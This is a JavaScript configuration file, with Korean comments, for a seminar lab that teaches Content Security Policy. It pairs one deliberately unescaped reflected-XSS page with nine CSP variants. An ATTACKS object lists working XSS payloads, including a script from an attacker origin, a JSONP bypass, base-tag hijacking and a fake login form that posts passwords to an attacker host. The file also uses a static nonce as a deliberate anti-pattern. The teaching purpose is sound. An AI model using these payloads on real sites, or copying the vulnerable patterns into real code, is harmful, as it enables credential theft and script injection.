// 각 랩 = "같은 취약한 페이지" + "다른 CSP".
// 페이지는 ?q= 값을 이스케이프 없이 그대로 HTML에 박는다 (Reflected XSS).
// 랩마다 바뀌는 것은 오직 응답 헤더의 정책뿐이다.

export const ORIGINS = {
  app: "http://localhost:3000",
  cdn: "http://localhost:3001",
  attacker: "http://localhost:4000",
};

const STATIC_NONCE = "c2VtaW5hci1zdGF0aWM="; // "seminar-static" — 고정 nonce 안티패턴 시연용

export const ATTACKS = {
  inlineHandler: {
    label: "인라인 이벤트 핸들러",
    payload: `<img src=x onerror="lab.pwn('img onerror')">`,
  },
  inlineScript: {
    label: "인라인 <script>",
    payload: `<script>lab.pwn('inline <script>')</script>`,
  },
  externalScript: {
    label: "공격자 서버 스크립트",
    payload: `<script src="${ORIGINS.attacker}/evil.js"></script>`,
  },
  jsonp: {
    label: "허용된 호스트의 JSONP",
    payload: `<script src="${ORIGINS.cdn}/jsonp?callback=lab.pwn('jsonp on allowlisted host');//"></script>`,
  },
  staticNonce: {
    label: "고정 nonce 재사용",
    payload: `<script nonce="${STATIC_NONCE}">lab.pwn('guessed static nonce')</script>`,
  },
  baseHijack: {
    label: "<base> 하이재킹",
    payload: `<base href="${ORIGINS.attacker}/">`,
  },
  formHijack: {
    label: "가짜 로그인 폼",
    payload: `<form action="${ORIGINS.attacker}/phish" method="post" class="phish"><b>세션이 만료되었습니다. 다시 로그인하세요.</b><input name="password" type="password" placeholder="비밀번호"><button>로그인</button></form>`,
  },
};

const flag = (query, name) => query.get(name) === "1";

export const LABS = [
  {
    id: "1-no-csp",
    title: "Lab 1. CSP 없음",
    summary:
      "브라우저는 HTML에 들어온 스크립트가 '우리 것'인지 '주입된 것'인지 구분하지 못한다. 전부 실행된다.",
    attacks: ["inlineHandler", "inlineScript", "externalScript"],
    policy: () => null,
  },
  {
    id: "2-unsafe-inline",
    title: "Lab 2. 'unsafe-inline'",
    summary:
      "외부 도메인은 막았지만 'unsafe-inline' 하나로 XSS의 99%인 인라인 주입이 다시 열린다. 사실상 CSP가 없는 것과 같다.",
    attacks: ["inlineHandler", "inlineScript", "externalScript"],
    policy: () => ({ script: "script-src 'self' 'unsafe-inline'" }),
  },
  {
    id: "3-allowlist",
    title: "Lab 3. 호스트 allowlist",
    summary:
      "인라인과 낯선 도메인은 막힌다. 하지만 '허용한 호스트'에 JSONP·오래된 라이브러리·사용자 업로드 같은 실행 가능한 엔드포인트가 하나라도 있으면 우회된다.",
    attacks: ["inlineScript", "externalScript", "jsonp"],
    policy: () => ({ script: `script-src 'self' ${ORIGINS.cdn}` }),
  },
  {
    id: "4-nonce",
    title: "Lab 4. nonce",
    summary:
      "요청마다 새로 만든 난수(nonce)를 가진 <script>만 실행된다. 공격자는 이번 응답의 nonce를 알 수 없다. 단, nonce가 고정이면(?static=1) 의미가 없다.",
    toggles: [{ key: "static", label: "고정 nonce 사용 (안티패턴)" }],
    attacks: ["inlineHandler", "inlineScript", "externalScript", "jsonp", "staticNonce"],
    nonce: (query) => (flag(query, "static") ? STATIC_NONCE : undefined),
    policy: ({ nonce }) => ({ script: `script-src 'nonce-${nonce}'` }),
    legitInline: true,
  },
  {
    id: "5-strict-dynamic",
    title: "Lab 5. 'strict-dynamic'",
    summary:
      "nonce로 신뢰한 스크립트(로더)가 document.createElement로 추가한 스크립트에 신뢰를 전파한다. GA(gtag.js)처럼 스크립트가 스크립트를 부르는 경우에 필요하다. HTML에 직접 주입된 <script src>는 여전히 막힌다.",
    toggles: [{ key: "sd", label: "'strict-dynamic' 추가" }],
    attacks: ["externalScript", "inlineScript"],
    policy: ({ nonce, query }) => ({
      script: `script-src 'nonce-${nonce}'${flag(query, "sd") ? " 'strict-dynamic'" : ""}`,
    }),
    legitScripts: ["/static/loader.js"],
  },
  {
    id: "6-connect-src",
    title: "Lab 6. connect-src — 공급망 공격",
    summary:
      "XSS가 아니라 '우리가 nonce를 붙여 실행한 번들' 안의 의존성이 오염된 경우. script-src로는 못 막는다. 대신 데이터를 어디로 보낼 수 있는지(connect-src, img-src)를 제한해 유출을 막는다.",
    toggles: [
      { key: "connect", label: "connect-src 'self'" },
      { key: "default", label: "default-src 'self' (img 비콘까지)" },
    ],
    attacks: [],
    policy: ({ nonce, query }) => ({
      script: `script-src 'nonce-${nonce}' 'strict-dynamic'`,
      extra: [
        flag(query, "default") ? "default-src 'self'" : null,
        flag(query, "connect") ? "connect-src 'self'" : null,
      ],
    }),
    legitScripts: ["/static/app-bundle.js"],
  },
  {
    id: "7-floor",
    title: "Lab 7. base-uri · form-action · object-src",
    summary:
      "script-src가 완벽해도 남는 구멍. <base>를 주입하면 우리 nonce 스크립트의 상대경로가 공격자 서버로 바뀐다(nonce가 붙어 있으니 실행됨). <form>을 주입하면 비밀번호가 외부로 전송된다. 스크립트가 아니라서 script-src와 무관하다.",
    toggles: [{ key: "floor", label: "base-uri · form-action · object-src 추가" }],
    attacks: ["baseHijack", "formHijack"],
    policy: ({ nonce, query }) => ({
      script: `script-src 'nonce-${nonce}' 'strict-dynamic'`,
      extra: flag(query, "floor")
        ? ["object-src 'none'", "base-uri 'self'", "form-action 'self'"]
        : [],
    }),
    legitScriptsAfterContent: ["static/widget.js"],
  },
  {
    id: "8-report-only",
    title: "Lab 8. Report-Only와 위반 리포트",
    summary:
      "Content-Security-Policy-Report-Only는 막지 않고 위반만 보고한다. 운영 중인 서비스에 바로 enforce를 걸면 분석·모니터링이 소리 없이 죽으므로, 먼저 이 모드로 위반을 모아 본다. /violations 에서 수집된 리포트를 볼 수 있다.",
    toggles: [
      { key: "enforce", label: "enforce로 전환" },
      { key: "jitless", label: "라이브러리 eval 프로브 끄기 (zod jitless)" },
    ],
    attacks: ["inlineHandler", "inlineScript"],
    reportOnly: (query) => !flag(query, "enforce"),
    policy: ({ nonce }) => ({
      script: `script-src 'nonce-${nonce}' 'strict-dynamic'`,
      extra: ["object-src 'none'", "base-uri 'self'", "report-uri /csp-report"],
    }),
    legitScripts: ["/static/schema-lib.js"],
  },
  {
    id: "9-frame-ancestors",
    title: "Lab 9. frame-ancestors — 클릭재킹",
    summary:
      "공격자 페이지가 우리 페이지를 투명 iframe으로 덮어 클릭을 훔친다. frame-ancestors는 '누가 나를 iframe에 넣을 수 있나'를 정한다. 스크립트와 무관한, 응답을 받는 쪽이 선언하는 지시어다.",
    toggles: [{ key: "fa", label: "frame-ancestors 'self'" }],
    attacks: [],
    policy: ({ query }) => ({
      script: "script-src 'self'",
      extra: flag(query, "fa") ? ["frame-ancestors 'self'"] : [],
    }),
    clickjack: true,
  },
];

export const buildPolicyHeader = (lab, { nonce, query }) => {
  const parts = lab.policy({ nonce, query });
  if (parts == null) {
    return null;
  }
  const value = [parts.script, ...(parts.extra ?? [])].filter(Boolean).join("; ");
  const reportOnly = lab.reportOnly?.(query) ?? false;
  return {
    name: reportOnly ? "Content-Security-Policy-Report-Only" : "Content-Security-Policy",
    value,
  };
};
